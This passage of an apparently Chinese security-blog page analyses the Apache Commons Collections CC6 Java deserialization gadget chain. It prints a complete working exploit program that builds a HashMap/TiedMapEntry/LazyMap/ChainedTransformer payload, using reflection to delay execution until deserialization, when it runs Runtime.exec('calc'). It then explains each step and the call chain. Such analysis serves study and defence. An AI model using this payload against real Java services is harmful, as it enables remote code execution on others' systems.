+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>,Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#66d9ef>null</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry(lazyMap, <span style=color:#e6db74>&#34;key&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> expMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        expMap.<span style=color:#a6e22e>put</span>(tiedMapEntry,<span style=color:#e6db74>&#34;value&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(expMap);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}  
+</span></span></code></pre></div><p><code>HashMap</code>的<code>put</code>方法自动调用<code>hashCode</code>方法，尝试构造exp，结果出现了一个神奇的现象，在序列化时就能弹出 计算器，与 URLDNS 链的情况一模一样。</p><p>所以我们需要在执行<code>put()</code>方法时，先不让其命令执行，在反序列化时再命令执行。</p><p>我们可以通过修改<code>Map lazyMap = LazyMap.decorate(map, chainedTransformer)</code>，来达到我们需要的效果。我们之前传的参数是<code>chainedTransformer</code>，如果我们在序列化的时候传入一个没用的东西，然后再在反序列化的时候通过反射改回<code>chainedTransformer</code>，就可以避免在序列化时触发命令执行。</p><h3 id=最终-exp>最终 EXP
+<a class=anchor href=#%e6%9c%80%e7%bb%88-exp>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.originaltest;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC6Test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>,Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#66d9ef>null</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazymap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, <span style=color:#66d9ef>new</span> ConstantTransformer(1));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> mapSerial <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry(lazymap, <span style=color:#e6db74>&#34;aaa&#34;</span>);
+</span></span><span style=display:flex><span>        mapSerial.<span style=color:#a6e22e>put</span>(tiedMapEntry,<span style=color:#e6db74>&#34;bbb&#34;</span>);
+</span></span><span style=display:flex><span>        map.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#34;aaa&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;</span>LazyMap<span style=color:#f92672>&gt;</span> lazyMapClass <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>class</span>;
+</span></span><span style=display:flex><span>        Field factory <span style=color:#f92672>=</span> lazyMapClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;factory&#34;</span>);
+</span></span><span style=display:flex><span>        factory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        factory.<span style=color:#a6e22e>set</span>(lazymap,chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(mapSerial);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>现在从头开始梳理一下利用链：</p><ol><li><p><code>HashMap</code>这个入口类重写了<code>readObject</code>方法，当<code>HashMap</code>被反序列化时会被自动执行，而在重写的<code>readObject</code>方法中会对<code>key</code>，也就是我们<code>put(key,value)</code>的<code>key</code>，调用<code>hash</code>方法，最终调用<code>key</code>的<code>hashCode()</code>方法。</p></li><li><p>所以我们要对<code>HashMap</code>的<code>key</code>进行构造，这时我们构造一个<code>TiedMapEntry</code>并放入键，值随便写一个，在调用链中就会调用<code>TiedMapEntry</code>的<code>hashCode</code>方法，在此方法中会调用<code>TiedMapEntry</code>的<code>getValue</code>方法，在<code>getValue</code>方法中会调用属性<code>map</code>的<code>get</code>方法。如果我们把这个<code>map</code>属性设置为<code>LazyMap</code>对象，就会调用<code>LazyMap</code>的<code>get</code>方法。之后就和 CC1 的利用链一样了。</p></li><li><p>然后就是关于以下部分源码的解读：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>Map lazymap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, <span style=color:#66d9ef>new</span> ConstantTransformer(1));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> mapSerial <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>TiedMapEntry tiedMapEntry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry(lazymap, <span style=color:#e6db74>&#34;aaa&#34;</span>);
+</span></span><span style=display:flex><span>mapSerial.<span style=color:#a6e22e>put</span>(tiedMapEntry,<span style=color:#e6db74>&#34;bbb&#34;</span>);
+</span></span><span style=display:flex><span>map.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#34;aaa&#34;</span>);
+</span></span></code></pre></div><p>首先创建了一个<code>HashMap</code>作为<code>LazyMap</code>的内部存储，然后创建一个<code>LazyMap</code>对象并用<code>new ConstantTransformer(1)</code>来防止序列化时触发命令执行。<code>HashMap&lt;Object, Object> mapSerial = new HashMap&lt;>()</code>这个<code>HashMap</code>则是最终要被序列化的入口类，然后创建一个<code>TiedMapEntry</code>对象用来接收<code>LazyMap</code>补全调用链，同时<code>TiedMapEntry</code>的<code>key</code>属性被设置为<code>aaa</code>，所以当调用<code>map.get(key)</code>时就为<code>lazymap.get("aaa")</code>。然后把我们的 payload 放到<code>HashMap</code>中，就能触发利用链。
+<strong>关于<code>map.remove("aaa")</code>的解释</strong>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>mapSerial.put(tiedMapEntry, &#34;bbb&#34;)
+</span></span><span style=display:flex><span>  │
+</span></span><span style=display:flex><span>  ├─→ HashMap.put()
+</span></span><span style=display:flex><span>  │     │
+</span></span><span style=display:flex><span>  │     └─→ putVal(hash(key), key, value, ...)
+</span></span><span style=display:flex><span>  │           │
+</span></span><span style=display:flex><span>  │           └─→ hash(tiedMapEntry)
+</span></span><span style=display:flex><span>  │                 │
+</span></span><span style=display:flex><span>  │                 └─→ tiedMapEntry.hashCode()    ← 入口
+</span></span><span style=display:flex><span>  │                       │
+</span></span><span style=display:flex><span>  │                       └─→ getValue()
+</span></span><span style=display:flex><span>  │                             │
+</span></span><span style=display:flex><span>  │                             └─→ lazymap.get(&#34;aaa&#34;)
+</span></span><span style=display:flex><span>  │                                   │
+</span></span><span style=display:flex><span>  │                                   ├─→ 检查内部 map 是否包含 &#34;aaa&#34;?
+</span></span><span style=display:flex><span>  │                                   │   map.containsKey(&#34;aaa&#34;) → false (map 是空的)
+</span></span><span style=display:flex><span>  │                                   │
+</span></span><span style=display:flex><span>  │                                   ├─→ 不包含！触发 factory
+</span></span><span style=display:flex><span>  │                                   │   factory.transform(&#34;aaa&#34;)
+</span></span><span style=display:flex><span>  │                                   │   ConstantTransformer(1).transform(&#34;aaa&#34;)
+</span></span><span style=display:flex><span>  │                                   │   返回: 1
+</span></span><span style=display:flex><span>  │                                   │
+</span></span><span style=display:flex><span>  │                                   ├─→ 放入内部 map
+</span></span><span style=display:flex><span>  │                                   │   map.put(&#34;aaa&#34;, 1)
+</span></span><span style=display:flex><span>  │                                   │   现在 map = {&#34;aaa&#34; → 1}
+</span></span><span style=display:flex><span>  │                                   │
+</span></span><span style=display:flex><span>  │                                   └─→ 返回 1
+</span></span><span style=display:flex><span>  │
+</span></span><span style=display:flex><span>  └─→ 最终 mapSerial = {tiedMapEntry → &#34;bbb&#34;}
+</span></span></code></pre></div><p>所以此时<code>LazyMap</code>中有一个键值对<code>aaa->1</code>，我们需要删除它，以便后续的调用。</p></li></ol><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>xxx.readObject()
+</span></span><span style=display:flex><span>	HashMap.put()
+</span></span><span style=display:flex><span>	HashMap.hash()
+</span></span><span style=display:flex><span>		TiedMapEntry.hashCode()
+</span></span><span style=display:flex><span>		TiedMapEntry.getValue()
+</span></span><span style=display:flex><span>			LazyMap.get()
+</span></span><span style=display:flex><span>				ChainedTransformer.transform()
+</span></span><span style=display:flex><span>					InvokerTransformer.transform()
+</span></span><span style=display:flex><span>						Runtime.exec()
+</span></span></code></pre></div><p>这是CC6的利用链。这也是最好用的利用链，因为不受 jdk 版本的影响。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#cc6-链分析>CC6 链分析</a><ul><li><a href=#寻找链子>寻找链子</a></li><li><a href=#与入口类结合的链子>与入口类结合的链子</a></li><li><a href=#最终-exp>最终 EXP</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
